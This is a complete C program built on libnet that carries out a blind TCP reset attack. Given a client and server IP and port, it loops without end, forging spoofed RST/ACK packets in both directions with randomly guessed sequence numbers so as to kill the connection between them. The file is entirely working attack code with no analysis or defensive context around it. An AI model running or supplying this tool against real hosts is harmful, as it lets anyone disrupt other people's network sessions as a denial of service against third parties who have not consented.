#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <time.h>

#define MAX_SEQ_NUMBER 0xfffffffful
#define WINDOW_SIZE 0x3fff
#define ATTACK_TEMPT 3

void usage() {
	fprintf(stderr, "\
	usage:\n\
		reset <client ip> <client port> <server ip> <server port>\n");
}	

int main(int argc, char* argv[]) {
	srand(time(NULL));

	if (argc != 5) {
		usage();
		exit(EXIT_FAILURE);
	}

	char* cli_ip = argv[1];
	char* cli_port = argv[2];
	char* srv_ip = argv[3];
	char* srv_port = argv[4];
	
	char err_buffer[LIBNET_ERRBUF_SIZE];
	libnet_t *l;

	l = libnet_init(LIBNET_RAW4, NULL, err_buffer);
	if (l == NULL) {
		fprintf(stderr, "libnet_init failed: %s\n", err_buffer);
		exit(EXIT_FAILURE);
	}

	u_int32_t srv_addr, cli_addr;
	u_int16_t srv_port_int, cli_port_int;

	cli_addr = libnet_name2addr4(l, cli_ip, LIBNET_DONT_RESOLVE);
	if (cli_addr == -1) {
		fprintf(stderr, "libnet_name2addr4 client failed: %s\n", libnet_geterror(l));
		exit(EXIT_FAILURE);
	}
	cli_port_int = atoi(cli_port);

	srv_addr = libnet_name2addr4(l, srv_ip, LIBNET_DONT_RESOLVE);
	if (srv_addr == -1) {
		fprintf(stderr, "linbet_name2addr4 server failed: %s\n", libnet_geterror(l));
		exit(EXIT_FAILURE);
	}
	srv_port_int = atoi(srv_port);

	unsigned long seq_number;

	libnet_ptag_t tcptag = LIBNET_PTAG_INITIALIZER,
		iptag = LIBNET_PTAG_INITIALIZER;

	int window_size = WINDOW_SIZE;
	socklen_t opt_size = sizeof(window_size);

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock != -1) {
		int snd_size, rsv_size;
		getsockopt(sock, SOL_SOCKET, SO_SNDBUF, &snd_size, &opt_size);
		getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rsv_size, &opt_size);
		
		if (snd_size > window_size) {
			window_size = snd_size;
		}
		if (rsv_size > window_size) {
			window_size = rsv_size;
		}

		close(sock);
	}
#ifdef DEBUG
	int i = 0;
	fprintf(stderr, "peeked window size: %d\n", window_size);
#endif

//	for (i = 0, seq_number = rand() % window_size + rand(); // shuffle initial seq to avoid naive discovery
//		i < MAX_SEQ_NUMBER / window_size + 2; 
//		seq_number += window_size, ++i) {
	while (1) {
		seq_number = rand() % window_size + rand() % (MAX_SEQ_NUMBER / window_size) * window_size;

#ifdef DEBUG
		if (++i % 1024 == 0) {
			fprintf(stderr, "%d packets sent\n", i);
		}
#endif

		//Try to forge a packet from server to client
		tcptag = libnet_build_tcp (
			srv_port_int,		//Src Port
			cli_port_int,		//Dst Port
			seq_number,			//Sequence Number
			1,					//Acknowledge Number
			TH_RST | TH_ACK,	//Control Flags, ACK and RST
			WINDOW_SIZE,		//Window Size
			0,					//Checksum
			0,					//Urgent
			LIBNET_TCP_H,		//Packet Length
			NULL,				//Payload
			0,					//Payload Size
			l,					//libnet handler
			tcptag);			//Packat Tag

		if (tcptag == -1) {
			fprintf(stderr, "libnet_build_tcp failed: %s\n", libnet_geterror(l));
			exit(EXIT_FAILURE);
		}

		iptag = libnet_build_ipv4 (
			LIBNET_IPV4_H + LIBNET_TCP_H,	//Packet Length
			0,								//Type of Service
			123,							//Identifier
			0,								//Fragment
			64,								//Time to Live
			IPPROTO_TCP,					//Upper Layer Protocol
			0,								//Checksum
			srv_addr,						//Src IP
			cli_addr,						//Dst IP
			NULL,							//Payload
			0,								//Length of Payload
			l,								//Libnet handle
			iptag);							//Packet Tag
		
		if (iptag == -1) {
			fprintf(stderr, "libnet_build_ipv4 failed: %s\n", libnet_geterror(l));
			exit(EXIT_FAILURE);
		}

		libnet_write(l);
		
		//Try to forge a packet from client to server
		tcptag = libnet_build_tcp (
			cli_port_int,		//Src Port
			srv_port_int,		//Dst Port
			seq_number,			//Sequence Number
			1,					//Acknowledge Number
			TH_RST | TH_ACK,	//Control Flags, ACK and RST
			WINDOW_SIZE,		//Window Size
			0,					//Checksum
			0,					//Urgent
			LIBNET_TCP_H,		//Packet Length
			NULL,				//Payload
			0,					//Payload Size
			l,					//libnet handler
			tcptag);			//Packat Tag

		if (tcptag == -1) {
			fprintf(stderr, "libnet_build_tcp failed: %s\n", libnet_geterror(l));
			exit(EXIT_FAILURE);
		}

		iptag = libnet_build_ipv4 (
			LIBNET_IPV4_H + LIBNET_TCP_H,	//Packet Length
			0,								//Type of Service
			999,							//Identifier
			0,								//Fragment
			64,								//Time to Live
			IPPROTO_TCP,					//Upper Layer Protocol
			0,								//Checksum
			cli_addr,						//Src IP
			srv_addr,						//Dst IP
			NULL,							//Payload
			0,								//Length of Payload
			l,								//Libnet handle
			iptag);		//Packet Tag
		
		if (iptag == -1) {
			fprintf(stderr, "libnet_build_ipv4 failed: %s\n", libnet_geterror(l));
			exit(EXIT_FAILURE);
		}

		libnet_write(l);
	}
	
	libnet_destroy(l);
	return 0;
}

